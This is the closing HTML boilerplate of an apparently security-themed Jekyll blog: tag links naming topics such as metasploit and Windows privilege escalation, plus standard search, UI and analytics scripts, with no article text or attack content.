<a class="post-tag" href="/tags/cracking/">cracking</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/remote-code-execution/">remote code execution</a> <a class="post-tag" href="/tags/unqoted-service-path/">unqoted service path</a> <a class="post-tag" href="/tags/windows-privesc/">windows privesc</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/arch-linux/">arch linux</a> <a class="post-tag" href="/tags/boot-managers/">boot managers</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
